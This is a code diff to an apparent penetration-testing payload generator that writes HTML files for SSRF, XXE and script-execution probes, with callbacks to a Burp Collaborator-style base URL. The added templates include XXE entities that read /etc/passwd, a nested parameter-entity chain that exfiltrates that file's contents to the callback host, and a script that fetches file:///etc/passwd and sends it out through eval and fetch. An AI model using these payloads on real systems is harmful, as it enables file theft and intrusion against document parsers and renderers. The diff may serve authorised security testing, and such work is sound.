@@ -27,6 +27,9 @@ def generate_html_payloads(output_dir, burp_collab, tech_filter='all', payload_t
     if should_generate_type('ssrf'):
         ssrf_dir = output_dir / 'ssrf'
         ssrf_dir.mkdir(exist_ok=True)
+    if should_generate_type('xxe'):
+        xxe_dir = output_dir / 'xxe'
+        xxe_dir.mkdir(exist_ok=True)
     if should_generate_type('rce') or should_generate_type('deserialization'):
         rce_dir = output_dir / 'rce'
         rce_dir.mkdir(exist_ok=True)
@@ -121,6 +124,112 @@ def generate_html_payloads(output_dir, burp_collab, tech_filter='all', payload_t
     if should_generate_type('ssrf'):
         with open(ssrf_dir / "ssrf4_iframe.html", 'w', encoding='utf-8') as f:
             f.write(html_ssrf4_iframe)
+        
+        html_ssrf5_form = f'''<!DOCTYPE html>
+<html>
+<head>
+<title>Test</title>
+</head>
+<body>
+<form action='{base_url}/ssrf-html-form' method='post'>
+<input type='submit' value='Submit'>
+</form>
+</body>
+</html>'''
+        with open(ssrf_dir / "ssrf5_form.html", 'w', encoding='utf-8') as f:
+            f.write(html_ssrf5_form)
+        
+        html_ssrf6_object = f'''<!DOCTYPE html>
+<html>
+<head>
+<title>Test</title>
+</head>
+<body>
+<object data='{base_url}/ssrf-html-object'></object>
+</body>
+</html>'''
+        with open(ssrf_dir / "ssrf6_object.html", 'w', encoding='utf-8') as f:
+            f.write(html_ssrf6_object)
+    
+    if should_generate_type('xxe'):
+        html_xxe1_doctype = f'''<!DOCTYPE html [
+<!ENTITY xxe SYSTEM "{base_url}/xxe-html-1">
+]>
+<html>
+<head>
+<title>&xxe;</title>
+</head>
+<body>
+Test
+</body>
+</html>'''
+        with open(xxe_dir / "xxe1_doctype.html", 'w', encoding='utf-8') as f:
+            f.write(html_xxe1_doctype)
+        
+        html_xxe2_file = f'''<!DOCTYPE html [
+<!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<html>
+<head>
+<title>&xxe;</title>
+</head>
+<body>
+Test
+</body>
+</html>'''
+        with open(xxe_dir / "xxe2_file.html", 'w', encoding='utf-8') as f:
+            f.write(html_xxe2_file)
+        
+        html_xxe3_parameter = f'''<!DOCTYPE html [
+<!ENTITY % xxe SYSTEM "{base_url}/xxe-html-3">
+%xxe;
+]>
+<html>
+<head>
+<title>Test</title>
+</head>
+<body>
+Test
+</body>
+</html>'''
+        with open(xxe_dir / "xxe3_parameter.html", 'w', encoding='utf-8') as f:
+            f.write(html_xxe3_parameter)
+        
+        html_xxe4_nested = f'''<!DOCTYPE html [
+<!ENTITY % remote SYSTEM "{base_url}/xxe-html-4">
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM '{base_url}/xxe-html-exfil?data=%file;'>">
+%remote;
+%eval;
+%exfil;
+]>
+<html>
+<head>
+<title>Test</title>
+</head>
+<body>
+Test
+</body>
+</html>'''
+        with open(xxe_dir / "xxe4_nested.html", 'w', encoding='utf-8') as f:
+            f.write(html_xxe4_nested)
+        
+        html_xxe5_svg_embed = f'''<!DOCTYPE html>
+<html>
+<head>
+<title>Test</title>
+</head>
+<body>
+<svg xmlns="http://www.w3.org/2000/svg">
+<!DOCTYPE svg [
+<!ENTITY xxe SYSTEM "{base_url}/xxe-html-svg">
+]>
+<text>&xxe;</text>
+</svg>
+</body>
+</html>'''
+        with open(xxe_dir / "xxe5_svg_embed.html", 'w', encoding='utf-8') as f:
+            f.write(html_xxe5_svg_embed)
     
     html_rce1_eval = f'''<!DOCTYPE html>
 <html>
@@ -147,6 +256,42 @@ def generate_html_payloads(output_dir, burp_collab, tech_filter='all', payload_t
     if should_generate_type('rce'):
         with open(rce_dir / "rce2_function.html", 'w', encoding='utf-8') as f:
             f.write(html_rce2_function)
+        
+        html_rce3_import = f'''<!DOCTYPE html>
+<html>
+<head>
+<title>Test</title>
+</head>
+<body>
+<script type="module">import('{base_url}/rce-html-import1')</script>
+</body>
+</html>'''
+        with open(rce_dir / "rce3_import.html", 'w', encoding='utf-8') as f:
+            f.write(html_rce3_import)
+        
+        html_rce4_worker = f'''<!DOCTYPE html>
+<html>
+<head>
+<title>Test</title>
+</head>
+<body>
+<script>var w=new Worker('{base_url}/rce-html-worker1');w.onmessage=()=>fetch('{base_url}/rce-html-worker1?executed=true')</script>
+</body>
+</html>'''
+        with open(rce_dir / "rce4_worker.html", 'w', encoding='utf-8') as f:
+            f.write(html_rce4_worker)
+        
+        html_rce5_file_eval = f'''<!DOCTYPE html>
+<html>
+<head>
+<title>Test</title>
+</head>
+<body>
+<script>fetch('file:///etc/passwd').then(r=>r.text()).then(d=>eval('fetch(\\'{base_url}/rce-html-file1?data=\\'+encodeURIComponent(d))'))</script>
+</body>
+</html>'''
+        with open(rce_dir / "rce5_file_eval.html", 'w', encoding='utf-8') as f:
+            f.write(html_rce5_file_eval)
     
     master_html = f'''<!DOCTYPE html>
 <html>
